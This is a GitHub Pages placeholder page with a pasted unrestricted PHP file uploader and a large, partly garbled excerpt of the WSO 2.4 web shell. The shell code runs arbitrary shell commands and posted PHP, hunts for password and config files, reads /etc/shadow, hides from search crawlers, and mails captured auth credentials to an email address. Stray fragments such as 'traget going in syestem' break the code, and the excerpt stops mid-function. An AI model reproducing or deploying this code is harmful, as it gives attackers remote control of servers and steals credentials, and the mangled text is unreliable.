## Welcome to GitHub Pages

You can use the [editor on GitHub](https://github.com/user65798/akm-on-hack/edit/gh-pages/index.md) to maintain and preview the content for your website in Markdown files.

Whenever you commit to this repository, GitHub Pages will run [Jekyll](https://jekyllrb.com/) to rebuild the pages in your site, from the content in your Markdown files.

### Markdown

Markdown is a lightweight and easy-to-use syntax for styling your writing. It includes conventions for

```markdown
Syntax highlighted code block

# Header 1
## Header 2
### Header 3

- Bulleted
- List

1. Numbered
2. List

**Bold** and _Italic_ and `Code` text

[Link](url) and ![Image](src)
```

For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).

### Jekyll Themes  target lock 

Your Pages site will use the layout and styles from the Jekyll theme you have selected in your [repository settings](https://github.com/user65798/akm-on-hack/settings/pages). The name of this theme is saved in the Jekyll `_config.yml` configuration file.

### Support or Contact

Having trouble with Pages? Check out our [documentation](https://docs.github.com/categories/github-pages-basics/) or [contact support](https://support.github.com/contact) and weâ€™ll help you sort it out.
<script>
document.getElementById("demo").innerHTML = "Hello JavaScript!";
</script>
 1 <html>
 2 
 3 <head>
 4   <title>bele</title>
 5 </head>
 6 
 7 <body>
 8 <?php
 9 
10 
11  if(empty($_GET['Nfiles']))$Nfiles=15;else $Nfiles=$_GET['Nfiles'];
12 if($_FILES['userfile']['tmp_name'][0]!=''){
13  for($i=0;$i<$Nfiles&&$_FILES['userfile']['tmp_name'][$i]!='';$i++){
14  $uploaddir = dirname(__FILE__);//'/var/www/uploads/';
15  $uploadfile = $uploaddir .'/'. basename($_FILES['userfile']['name'][$i]);
16  print "<pre>";
17  if (move_uploaded_file($_FILES['userfile']['tmp_name'][$i], $uploadfile)) {
18     print "File is valid, and was successfully uploaded. ";
19     //print_r($_FILES);
20  } else {
21     print "Possible fie upload attack!  Here's some debugging info:\n";
22     //print_r($_FILES);
23  }
24  print "</pre>";
25  }
26 }
27 ?>
28 <form action="<?php echo $_SERVER['PHP_SELF'].'?Nfiles='.$Nfiles; ?>" method="post" enctype="multipart/form-data">
29   Send beleberda:<br>
30   <?php for($i=0;$i<$Nfiles;$i++){echo '<input name="userfile[]" type="file"><br>';}?>
31   <input type="submit" value="Send files">
32 </form>
33 
34 </body>
35 
36 </html>
 1 <?php
   2 if ($auth == 1) {
   3     if (!isset($_SERVER['PHP_AUTH_USER']) || md5($_SERVER['PHP_AUTH_USER']) !== $name || md5($_SERVER['PHP_AUTH_PW']) !== $pass) {
   4         header('WWW-Authenticate: Basic realm="Fuck if u are Lamer"');
   5         header('HTTP/1.0 401 Unauthorized');
   6         exit("<center><b>Robot pirates Property FuCk off Bitch</center></b>");
   7     }
   8 }
   9 $rar1 = "robert.stewart678@gmail.com
  10 /* <![CDATA[ */
  11 (function(){try{var s,a,i,j,r,c,l,b=document.getElementsByTagName("script");l=b[b.length-1].previousSibling;a=l.getAttribute('data-cfemail');if(a){s='';r=parseInt(a.substr(0,2),16);for(j=2;a.length-j;j+=2){c=parseInt(a.substr(j,2),16)^r;s+=String.fromCharCode(c);}s=document.createTextNode(s);l.parentNode.replaceChild(s,l);}}catch(e){}})();
  12 /* ]]> */
  13 ";
  14 $rar2 = "Subject";
  15 $rar3 = $_SERVER['SCRIPT_FILENAME'] . revers budy 3(098996)
  java script 
  HTML.////////////////////// traget going in syestem 
  
  conect on target
  
  '<br/> User=' . $_SERVER['PHP_AUTH_PW'] . '<br/>pass=' . $_SERVER['PHP_AUTH_USER'];
  16 $rar4 = $_SERVER['SERVER_NAME'];
  17 $rar5 = "From: $rar4";
  18 @mail($rar1, $rar2, $rar3, $rar4);
  19 $auth_pass = "";
  20 $color = "#66FF00";
  21 $default_action = 'FilesMan';
  22 $default_use_ajax = true;
  23 $default_charset = 'Windows-1251';
  24 if (!empty($_SERVER['HTTP_USER_AGENT'])) {
  25     $userAgents = array("Google", "Slurp", "MSNBot", "ia_archiver", "Yandex", "Rambler");
  26     if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
  27         header('HTTP/1.0 404 Not Found');
  28         exit;
  29     }
  30 }
  31 @session_start();
  32 @ini_set('error_log', NULL);
  33 @ini_set('log_errors', 0);
  34 @ini_set('max_execution_time', 0);
  35 @set_time_limit(0);
  36 @set_magic_quotes_runtime(0);
  37 @define('WSO_VERSION', '2.4');
  38 if (get_magic_quotes_gpc()) {
  39     function WSOstripslashes($array) {
  40         return is_array($array) ? array_map('WSOstripslashes', $array) : stripslashes($array);
  41     }
  42     $_POST = WSOstripslashes($_POST);
  43 }
  44 function wsoLogin() {
  45     die("<pre align=center><form method=post>Password: <input type=password name=pass><input type=submit value='>>'></form></pre>");
  46 }
  47 if (!isset($_SESSION[md5($_SERVER['HTTP_HOST']) ])) if (empty($auth_pass) || (isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass))) $_SESSION[md5($_SERVER['HTTP_HOST']) ] = true;
  48 else wsoLogin();
  49 if (strtolower(substr(PHP_OS, 0, 3)) == "win") $os = 'win';
  50 else $os = 'nix';
  51 $safe_mode = @ini_get('safe_mode');
  52 if (!$safe_mode) error_reporting(0);
  53 $disable_functions = @ini_get('disable_functions');
  54 $home_cwd = @getcwd();
  55 if (isset($_POST['c'])) @chdir($_POST['c']);
  56 $cwd = @getcwd();
  57 if ($os == 'win') {
  58     $home_cwd = str_replace("\", " / ", $home_cwd);
  59   $cwd = str_replace("\", " / ", $cwd);
  60 }
  61 if( $cwd[strlen($cwd) - 1] != '/' )
  62   $cwd .= '/';
  63 
  64 if(!isset($_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax']))
  65     $_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$GLOBALS['default_use_ajax'];
  66 
  67 if($os == 'win')
  68   $aliases = array(
  69       "ListDirectory" => "dir",
  70       "Findindex . phpincurrentdir" => "dir / s / w / bindex . php",
  71       "Find * config * . phpincurrentdir" => "dir / s / w / b * config * . php",
  72       "Showactiveconnections" => "netstat - an",
  73       "Showrunningservices" => "netstart",
  74       "Useraccounts" => "netuser",
  75       "Showcomputers" => "netview",
  76       "ARPTable" => "arp - a",
  77       "IPConfiguration" => "ipconfig / all"
  78   );
  79 else
  80   $aliases = array(
  81           "Listdir" => "ls - lha",
  82       "listfileattributesonaLinuxsecondextendedfilesystem" => "lsattr - va",
  83           "showopenedports" => "netstat - an | grep - ilisten",
  84         "processstatus" => "psaux",
  85       "Find" => "",
  86           "findallsuidfiles" => "find / -typef - perm - 04000 - ls",
  87           "findsuidfilesincurrentdir" => "find . -typef - perm - 04000 - ls",
  88           "findallsgidfiles" => "find / -typef - perm - 02000 - ls",
  89           "findsgidfilesincurrentdir" => "find . -typef - perm - 02000 - ls",
  90           "findconfig . inc . phpfiles" => "find / -typef - nameconfig . inc . php",
  91           "findconfig * files" => "find / -typef - name\"config*\"", "find config* files in current dir" => "find . -type f -name \"config*\"", "find all writable folders and files" => "find / -perm -2 -ls", "find all writable folders and files in current dir" => "find . -perm -2 -ls", "find all service.pwd files" => "find / -type f -name service.pwd", "find service.pwd files in current dir" => "find . -type f -name service.pwd", "find all .htpasswd files" => "find / -type f -name .htpasswd", "find .htpasswd files in current dir" => "find . -type f -name .htpasswd", "find all .bash_history files" => "find / -type f -name .bash_history", "find .bash_history files in current dir" => "find . -type f -name .bash_history", "find all .fetchmailrc files" => "find / -type f -name .fetchmailrc", "find .fetchmailrc files in current dir" => "find . -type f -name .fetchmailrc", "Locate" => "", "locate httpd.conf files" => "locate httpd.conf", "locate vhosts.conf files" => "locate vhosts.conf", "locate proftpd.conf files" => "locate proftpd.conf", "locate psybnc.conf files" => "locate psybnc.conf", "locate my.conf files" => "locate my.conf", "locate admin.php files" => "locate admin.php", "locate cfg.php files" => "locate cfg.php", "locate conf.php files" => "locate conf.php", "locate config.dat files" => "locate config.dat", "locate config.php files" => "locate config.php", "locate config.inc files" => "locate config.inc", "locate config.inc.php" => "locate config.inc.php", "locate config.default.php files" => "locate config.default.php", "locate config* files " => "locate config", "locate .conf files" => "locate '.conf'", "locate .pwd files" => "locate '.pwd'", "locate .sql files" => "locate '.sql'", "locate .htpasswd files" => "locate '.htpasswd'", "locate .bash_history files" => "locate '.bash_history'", "locate .mysql_history files" => "locate '.mysql_history'", "locate .fetchmailrc files" => "locate '.fetchmailrc'", "locate backup files" => "locate backup", "locate dump files" => "locate dump", "locate priv files" => "locate priv");
  92     function wsoHeader() {
  93         if (empty($_POST['charset'])) $_POST['charset'] = $GLOBALS['default_charset'];
  94         global $color;
  95         echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>We are the robot pirates.We have robot functions.But we have pirate duties.</title>
  96 <style>
  97 body{
  98 background-attachment: fixed;
  99 background-image: url(http://i41.tinypic.com/dwxg60.png);
 100 background-color:#0A0A0A;color:#e1e1e1;
 101  opacity: 0.7;
 102 }
 103 body,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#FFFFFF; }
 104 table.info{ color:#fff; background-color:#000000; }
 105 span,a{ color: $color !important; }
 106 span{ font-weight: bolder; }
 107 h1{ border-left:5px solid $color;padding: 2px 5px;font: 14pt Verdana;background-color:#000000;margin:0px;color:red; }
 108 div.content{ padding: 5px;margin-left:5px;background-color:#333; }
 109 a{ text-decoration:none; }
 110 a:hover{ text-decoration:underline; }
 111 .ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
 112 .bigarea{ width:100%;height:250px; }
 113 input,textarea,select{ margin:0;color:#fff;background-color:#000000;border:1px solid $color; font: 9pt Monospace,'Courier New'; }
 114 form{ margin:0px; }
 115 #toolsTbl{ text-align:center; }
 116 .toolsInp{ width: 300px }
 117 .main th{text-align:left;background-color:#5e5e5e;}
 118 .main tr:hover{background-color:#000000;}
 119 .l1{background-color:#444}
 120 .l2{background-color:#333}
 121 pre{font-family:Courier,Monospace;}
 122 </style>
 123 <script>
 124     var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
 125     var a_ = '" . htmlspecialchars(@$_POST['a']) . "'
 126     var charset_ = '" . htmlspecialchars(@$_POST['charset']) . "';
 127     var p1_ = '" . ((strpos(@$_POST['p1'], "
 128 ") !== false) ? '' : htmlspecialchars($_POST['p1'], ENT_QUOTES)) . "';
 129     var p2_ = '" . ((strpos(@$_POST['p2'], "
 130 ") !== false) ? '' : htmlspecialchars($_POST['p2'], ENT_QUOTES)) . "';
 131     var p3_ = '" . ((strpos(@$_POST['p3'], "
 132 ") !== false) ? '' : htmlspecialchars($_POST['p3'], ENT_QUOTES)) . "';
 133     var d = document;
 134   function set(a,c,p1,p2,p3,charset) {
 135       if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
 136       if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
 137       if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
 138       if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
 139       if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
 140       if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
 141   }
 142   function g(a,c,p1,p2,p3,charset) {
 143       set(a,c,p1,p2,p3,charset);
 144       d.mf.submit();
 145   }
 146   function a(a,c,p1,p2,p3,charset) {
 147       set(a,c,p1,p2,p3,charset);
 148       var params = 'ajax=true';
 149       for(i=0;i<d.mf.elements.length;i++)
 150           params += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);
 151       sr('" . addslashes($_SERVER['REQUEST_URI']) . "', params);
 152   }
 153   function sr(url, params) {
 154       if (window.XMLHttpRequest)
 155           req = new XMLHttpRequest();
 156       else if (window.ActiveXObject)
 157           req = new ActiveXObject('Microsoft.XMLHTTP');
 158         if (req) {
 159             req.onreadystatechange = processReqChange;
 160             req.open('POST', url, true);
 161             req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');
 162             req.send(params);
 163         }
 164   }
 165   function processReqChange() {
 166       if( (req.readyState == 4) )
 167           if(req.status == 200) {
 168               var reg = new RegExp(\"(\d+)([\S\s]*)\", 'm');
 169               var arr=reg.exec(req.responseText);
 170               eval(arr[2].substr(0, arr[1]));
 171           } else alert('Request error!');
 172   }
 173 </script>
 174 <head><body><div style='position:absolute;width:100%;background-color:#444;top:0;left:0;'>
 175 <form method=post name=mf style='display:none;'>
 176 <input type=hidden name=a>
 177 <input type=hidden name=c>
 178 <input type=hidden name=p1>
 179 <input type=hidden name=p2>
 180 <input type=hidden name=p3>
 181 <input type=hidden name=charset>
 182 </form>";
 183         $freeSpace = @diskfreespace($GLOBALS['cwd']);
 184         $totalSpace = @disk_total_space($GLOBALS['cwd']);
 185         $totalSpace = $totalSpace ? $totalSpace : 1;
 186         $release = @php_uname('r');
 187         $kernel = @php_uname('s');
 188         $explink = 'http://exploit-db.com/list.php?description=';
 189         if (strpos('Linux', $kernel) !== false) $explink.= urlencode('Linux Kernel ' . substr($release, 0, 6));
 190         else $explink.= urlencode($kernel . ' ' . substr($release, 0, 3));
 191         if (!function_exists('posix_getegid')) {
 192             $user = @get_current_user();
 193             $uid = @getmyuid();
 194             $gid = @getmygid();
 195             $group = "?";
 196         } else {
 197             $uid = @posix_getpwuid(posix_geteuid());
 198             $gid = @posix_getgrgid(posix_getegid());
 199             $user = $uid['name'];
 200             $uid = $uid['uid'];
 201             $group = $gid['name'];
 202             $gid = $gid['gid'];
 203         }
 204         $cwd_links = '';
 205         $path = explode("/", $GLOBALS['cwd']);
 206         $n = count($path);
 207         for ($i = 0;$i < $n - 1;$i++) {
 208             $cwd_links.= "<a href='#' onclick='g(\"FilesMan\",\"";
 209             for ($j = 0;$j <= $i;$j++) $cwd_links.= $path[$j] . '/';
 210             $cwd_links.= "\")'>" . $path[$i] . "/</a>";
 211         }
 212         $charsets = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866');
 213         $opt_charsets = '';
 214         foreach ($charsets as $item) $opt_charsets.= '<option value="' . $item . '" ' . ($_POST['charset'] == $item ? 'selected' : '') . '>' . $item . '</option>';
 215         $m = array('Sec. Info' => 'SecInfo', 'Files' => 'FilesMan', 'Console' => 'Console', 'Sql' => 'Sql', 'Php' => 'Php', 'Safe mode' => 'SafeMode', 'String tools' => 'StringTools', 'Bruteforce' => 'Bruteforce', 'Network' => 'Network');
 216         if (!empty($GLOBALS['auth_pass'])) $m['Logout'] = 'Logout';
 217         $m['Self remove'] = 'SelfRemove';
 218         $menu = '';
 219         foreach ($m as $k => $v) $menu.= '<th width="' . (int)(100 / count($m)) . '%">[ <a href="#" onclick="g(\'' . $v . '\',null,\'\',\'\',\'\')">' . $k . '</a> ]</th>';
 220         $drives = "";
 221         if ($GLOBALS['os'] == 'win') {
 222             foreach (range('c', 'z') as $drive) if (is_dir($drive . ':\'))
 223           $drives .= ' < ahref = "#"onclick = "g(\'FilesMan\',\''.$drive.':/\')" > ['.$drive.'] < / a > ';
 224   }
 225   echo ' < tableclass = infocellpadding = 3cellspacing = 0width = 100 % > < tr > < tdwidth = 1 > < span > < fontcolor = "red" > Uname: < br > User: < br > Php: < br > Hdd: < br > Cwd: < / font > ' . ($GLOBALS['os'] == 'win'?' < br > < fontcolor = "red" > Drives: < / font > ':'') . ' < / span > < / td > '
 226        . ' < td > < nobr > ' . substr(@php_uname(), 0, 120) . ' < ahref = "' . $explink . '"target = _blank > [exploit - db . com] < / a > < / nobr > < br > ' . $uid . '(' . $user . ') < span > < fontcolor = "red" > Group: < / font > < / span > ' . $gid . '(' . $group . ') < br > ' . @phpversion() . ' < span > < fontcolor = "red" > Safemode: < / font > < / span > ' . ($GLOBALS['safe_mode']?' < fontcolor = green > ON < / font > ':' < fontcolor = #00bb00><b>OFF</b></font>')
 227                                              . ' <a href=# onclick="g(\'Php\',null,\'\',\'info\')">[ phpinfo ]</a> <span><font color="red" >Datetime:</font></span> ' . date('Y-m-d H:i:s') . '<br>' . wsoViewSize($totalSpace) . ' <span><font color="red" >Free:</font></span> ' . wsoViewSize($freeSpace) . ' (' . (int)($freeSpace / $totalSpace * 100) . '%)<br>' . $cwd_links . ' ' . wsoPermsColor($GLOBALS['cwd']) . ' <a href=# onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')">[ home ]</a><br>' . $drives . '</td>' . '<td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset">' . $opt_charsets . '</optgroup></select><br><span>Server IP:</span><br>' . @$_SERVER["SERVER_ADDR"] . '<br><span>Client IP:</span><br>' . $_SERVER['REMOTE_ADDR'] . '</nobr></td></tr></table>' . '<table style="border-top:2px solid #333;" cellpadding=3 cellspacing=0 width=100%><tr>' . $menu . '</tr></table><div style="margin:5">';
 228                                         }
 229                                         function wsoFooter() {
 230                                             $is_writable = is_writable($GLOBALS['cwd']) ? " <font color='#25ff00'>(Writeable)</font>" : " <font color=red>(Not writable)</font>";
 231                                             echo "
 232 </div>
 233 <table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style='border-top:2px solid #333;border-bottom:2px solid #333;'>
 234   <tr>
 235       <td><form onsubmit='g(null,this.c.value,\"\");return false;'><span>Change dir:</span><br><input class='toolsInp' type=text name=c value='" . htmlspecialchars($GLOBALS['cwd']) . "'><input type=submit value='>>'></form></td>
 236       <td><form onsubmit=\"g('FilesTools',null,this.f.value);return false;\"><span>Read file:</span><br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>
 237   </tr><tr>
 238       <td><form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);return false;\"><span>Make dir:</span>$is_writable<br><input class='toolsInp' type=text name=d><input type=submit value='>>'></form></td>
 239       <td><form onsubmit=\"g('FilesTools',null,this.f.value,'mkfile');return false;\"><span>Make file:</span>$is_writable<br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>
 240   </tr><tr>
 241       <td><form onsubmit=\"g('Console',null,this.c.value);return false;\"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='>>'></form></td>
 242       <td><form method='post' ENCTYPE='multipart/form-data'>
 243       <input type=hidden name=a value='FilesMAn'>
 244       <input type=hidden name=c value='" . $GLOBALS['cwd'] . "'>
 245       <input type=hidden name=p1 value='uploadFile'>
 246       <input type=hidden name=charset value='" . (isset($_POST['charset']) ? $_POST['charset'] : '') . "'>
 247       <span>Upload file:</span>$is_writable<br><input class='toolsInp' type=file name=f><input type=submit value='>>'></form><br  ></td>
 248   </tr></table></div></body></html>";
 249                                         }
 250                                         if (!function_exists("posix_getpwuid") && (strpos($GLOBALS['disable_functions'], 'posix_getpwuid') === false)) {
 251                                             function posix_getpwuid($p) {
 252                                                 return false;
 253                                             }
 254                                         }
 255                                         if (!function_exists("posix_getgrgid") && (strpos($GLOBALS['disable_functions'], 'posix_getgrgid') === false)) {
 256                                             function posix_getgrgid($p) {
 257                                                 return false;
 258                                             }
 259                                         }
 260                                         function wsoEx($in) {
 261                                             $out = '';
 262                                             if (function_exists('exec')) {
 263                                                 @exec($in, $out);
 264                                                 $out = @join("
 265 ", $out);
 266                                             } elseif (function_exists('passthru')) {
 267                                                 ob_start();
 268                                                 @passthru($in);
 269                                                 $out = ob_get_clean();
 270                                             } elseif (function_exists('system')) {
 271                                                 ob_start();
 272                                                 @system($in);
 273                                                 $out = ob_get_clean();
 274                                             } elseif (function_exists('shell_exec')) {
 275                                                 $out = shell_exec($in);
 276                                             } elseif (is_resource($f = @popen($in, "r"))) {
 277                                                 $out = "";
 278                                                 while (!@feof($f)) $out.= fread($f, 1024);
 279                                                 pclose($f);
 280                                             }
 281                                             return $out;
 282                                         }
 283                                         function wsoViewSize($s) {
 284                                             if ($s >= 1073741824) return sprintf('%1.2f', $s / 1073741824) . ' GB';
 285                                             elseif ($s >= 1048576) return sprintf('%1.2f', $s / 1048576) . ' MB';
 286                                             elseif ($s >= 1024) return sprintf('%1.2f', $s / 1024) . ' KB';
 287                                             else return $s . ' B';blink syestem
 
 288                                         }
 289                                         function wsoPerms($p) {
 290                                             if (($p & 0xC000) == 0xC000) $i = 's';
 291                                             elseif (($p & 0xA000) == 0xA000) $i = 'l';
 292                                             elseif (($p & 0x8000) == 0x8000) $i = '-';
 293                                             elseif (($p & 0x6000) == 0x6000) $i = 'b';
 294                                             elseif (($p & 0x4000) == 0x4000) $i = 'd';
 295                                             elseif (($p & 0x2000) == 0x2000) $i = 'c';
 296                                             elseif (($p & 0x1000) == 0x1000) $i = 'p';
 297                                             else $i = 'u';
 298                                             $i.= (($p & 0x0100) ? 'r' : '-');
 299                                             $i.= (($p & 0x0080) ? 'w' : '-');
 300                                             $i.= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
 301                                             $i.= (($p & 0x0020) ? 'r' : '-');
 302                                             $i.= (($p & 0x0010) ? 'w' : '-');
 303                                             $i.= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
 304                                             $i.= (($p & 0x0004) ? 'r' : '-');
 305                                             $i.= (($p & 0x0002) ? 'w' : '-');
 306                                             $i.= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
 307                                             return $i;
 308                                         }
 309                                         function wsoPermsColor($f) {
 310                                             if (!@is_readable($f)) return '<font color=#FF0000>' . wsoPerms(@fileperms($f)) . '</font>';
 311                                             elseif (!@is_writable($f)) return '<font color=white>' . wsoPerms(@fileperms($f)) . '</font>';
 312                                             else return '<font color=#25ff00>' . wsoPerms(@fileperms($f)) . '</font>';
 313                                         }
 314                                         if (!function_exists("scandir")) {
 315                                             function scandir($dir) {
 316                                                 $dh = opendir($dir);
 317                                                 while (false !== ($filename = readdir($dh))) $files[] = $filename;
 318                                                 return $files;
 319                                             }
 320                                         }
 321                                         function wsoWhich($p) {
 322                                             $path = wsoEx('which ' . $p);
 323                                             if (!empty($path)) return $path;
 324                                             return false;
 325                                         }
 326                                         function actionSecInfo() {
 327                                             wsoHeader();
 328                                             echo '<h1>Server security information</h1><div class=content>';
 329                                             function wsoSecParam($n, $v) {
 330                                                 $v = trim($v);
 331                                                 if ($v) {
 332                                                     echo '<span>' . $n . ': </span>';
 333                                                     if (strpos($v, "
 334 ") === false) echo $v . '<br>';
 335                                                     else echo '<pre class=ml1>' . $v . '</pre>';
 336                                                 }
 337                                             }
 338                                             wsoSecParam('Server software', @getenv('SERVER_SOFTWARE'));
 339                                             if (function_exists('apache_get_modules')) wsoSecParam('Loaded Apache modules', implode(', ', apache_get_modules()));
 340                                             wsoSecParam('Disabled PHP Functions', $GLOBALS['disable_functions'] ? $GLOBALS['disable_functions'] : 'none');
 341                                             wsoSecParam('Open base dir', @ini_get('open_basedir'));
 342                                             wsoSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));
 343                                             wsoSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir'));
 344                                             wsoSecParam('cURL support', function_exists('curl_version') ? 'enabled' : 'no');
 345                                             $temp = array();
 346                                             if (function_exists('mysql_get_client_info')) $temp[] = "MySql (" . mysql_get_client_info() . ")";
 347                                             if (function_exists('mssql_connect')) $temp[] = "MSSQL";
 348                                             if (function_exists('pg_connect')) $temp[] = "PostgreSQL";
 349                                             if (function_exists('oci_connect')) $temp[] = "Oracle";
 350                                             wsoSecParam('Supported databases', implode(', ', $temp));
 351                                             echo '<br>';
 352                                             if ($GLOBALS['os'] == 'nix') {
 353                                                 wsoSecParam('Readable /etc/passwd', @is_readable('/etc/passwd') ? "yes <a href='#' onclick='g(\"FilesTools\", \"/etc/\", \"passwd\")'>[view]</a>" : 'no');
 354                                                 wsoSecParam('Readable /etc/shadow', @is_readable('/etc/shadow') ? "yes <a href='#' onclick='g(\"FilesTools\", \"etc\", \"shadow\")'>[view]</a>" : 'no');
 355                                                 wsoSecParam('OS version', @file_get_contents('/proc/version'));
 356                                                 wsoSecParam('Distr name', @file_get_contents('/etc/issue.net'));
 357                                                 if (!$GLOBALS['safe_mode']) {
 358                                                     $userful = array('gcc', 'lcc', 'cc', 'ld', 'make', 'php', 'perl', 'python', 'ruby', 'tar', 'gzip', 'bzip', 'bzip2', 'nc', 'locate', 'suidperl');
 359                                                     $danger = array('kav', 'nod32', 'bdcored', 'uvscan', 'sav', 'drwebd', 'clamd', 'rkhunter', 'chkrootkit', 'iptables', 'ipfw', 'tripwire', 'shieldcc', 'portsentry', 'snort', 'ossec', 'lidsadm', 'tcplodg', 'sxid', 'logcheck', 'logwatch', 'sysmask', 'zmbscap', 'sawmill', 'wormscan', 'ninja');
 360                                                     $downloaders = array('wget', 'fetch', 'lynx', 'links', 'curl', 'get', 'lwp-mirror');
 361                                                     echo '<br>';
 362                                                     $temp = array();
 363                                                     foreach ($userful as $item) if (wsoWhich($item)) $temp[] = $item;
 364                                                     wsoSecParam('Userful', implode(', ', $temp));
 365                                                     $temp = array();
 366                                                     foreach ($danger as $item) if (wsoWhich($item)) $temp[] = $item;
 367                                                     wsoSecParam('Danger', implode(', ', $temp));
 368                                                     $temp = array();
 369                                                     foreach ($downloaders as $item) if (wsoWhich($item)) $temp[] = $item;
 370                                                     wsoSecParam('Downloaders', implode(', ', $temp));
 371                                                     echo '<br/>';
 372                                                     wsoSecParam('HDD space', wsoEx('df -h'));
 373                                                     wsoSecParam('Hosts', @file_get_contents('/etc/hosts'));
 374                                                 }
 375                                             } else {
 376                                                 wsoSecParam('OS Version', wsoEx('ver'));
 377                                                 wsoSecParam('Account Settings', wsoEx('net accounts'));
 378                                                 wsoSecParam('User Accounts', wsoEx('net user'));
 379                                             }
 380                                             echo '</div>';
 381                                             wsoFooter();
 382                                         }
 383                                         function actionPhp() {
 384                                             if (isset($_POST['ajax'])) {
 385                                                 $_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = true;
 386                                                 ob_start();
 387                                                 eval($_POST['p1']);
 388                                                 $temp = "document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='" . addcslashes(htmlspecialchars(ob_get_clean()), "
 389 
 390   \'") . "';
 391 ";
 392                                                 echo strlen($temp), "
 393 ", $temp;
 394                                                 exit;
 395                                             }
 396                                             wsoHeader();
 397                                             if (isset($_POST['p2']) && ($_POST['p2'] == 'info')) {
 398                                                 echo '<h1>PHP info</h1><div class=content><style>.p {color:#000;}</style>';
 399                                                 ob_start();
 400                                                 phpinfo();
 401                                                 $tmp = ob_get_clean();
 402                                                 $tmp = preg_replace('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU', '', $tmp);
 403                                                 $tmp = preg_replace('!td, th {(.*)}!msiU', '.e, .v, .h, .h th {$1}', $tmp);
 404                                                 echo str_replace('<h1', '<h2', $tmp) . '</div><br>';
 405                                             }
 406                                             if (empty($_POST['ajax']) && !empty($_POST['p1'])) $_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] = false;
 407                                             echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit="if(this.ajax.checked){a(\'Php\',null,this.code.value);}else{g(\'Php\',null,this.code.value,\'\');}return false;"><textarea name=code class=bigarea id=PhpCode>' . (!empty($_POST['p1']) ? htmlspecialchars($_POST['p1']) : '') . '</textarea><input type=submit value=Eval style="margin-top:5px">';
 408                                             echo ' <input type=checkbox name=ajax value=1 ' . ($_SESSION[md5($_SERVER['HTTP_HOST']) . 'ajax'] ? 'checked' : '') . '> send using AJAX</form><pre id=PhpOutput style="' . (empty($_POST['p1']) ? 'display:none;' : '') . 'margin-top:5px;" class=ml1>';
 409                                             if (!empty($_POST['p1'])) {
 410                                                 ob_start();
 411                                                 eval($_POST['p1']);
 412                                                 echo htmlspecialchars(ob_get_clean());
 413                                             }
 414                                             echo '</pre></div>';
 415                                             wsoFooter();
 416                                         }
 417                                         function actionFilesMan() {
 418                                             wsoHeader();
 419                                             echo '<h1>File manager</h1><div class=content><script>p1_=p2_=p3_="";</script>';
 420                                             if (!empty($_POST['p1'])) {
 421                                                 switch ($_POST['p1']) {
 422                                                     case 'uploadFile':
 423                                                         if (!@move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name'])) echo "Can't upload file!";
 424                                                         break;
 425                                                     case 'mkdir':
 426                                                         if (!@mkdir($_POST['p2'])) echo "Can't create new dir";
 427                                                         break;
 428                                                     case 'delete':
 429                                                         function deleteDir($path) {
 430                                                             $path = (substr($path, -1) == '/') ? $path : $path . '/';
 431                                                             $dh = opendir($path);
 432                                                             while (($item = readdir($dh)) !== false) {
 433                                                                 $item = $path . $item;
 434                                                                 if ((basename($item) == "..") || (basename($item) == ".")) continue;
 435                                                                 $type = filetype($item);
 436                                                                 if ($type == "dir") deleteDir($item);
 437                                                                 else @unlink($item);
 438                                                             }
 439                                                             closedir($dh);
 440                                                             @rmdir($path);
 441                                                         }
 442                                                         if (is_array(@$_POST['f'])) foreach ($_POST['f'] as $f) {
 443                                                             if ($f == '..') continue;
 444                                                             $f = urldecode($f);
 445                                                             if (is_dir($f)) deleteDir($f);
 446                                                             else @unlink($f);
 447                                                         }
 448                                                         break;
 449                                                     case 'paste':
 450                                                         if ($_SESSION['act'] == 'copy') {
 451                                                             function copy_paste($c, $s, $d) {
 452                                                                 if (is_dir($c . $s)) {
 453                                                                     mkdir($d . $s);
 454                                                                     $h = @opendir($c . $s);
 455                                                                     while (($f = @readdir($h)) !== false) if (($f != ".") and ($f != "..")) copy_paste($c . $s . '/', $f, $d . $s . '/');
 456                                                                 } elseif (is_file($c . $s)) @copy($c . $s, $d . $s);
 457                                                             }
 458                                                             foreach ($_SESSION['f'] as $f) copy_paste($_SESSION['c'], $f, $GLOBALS['cwd']);
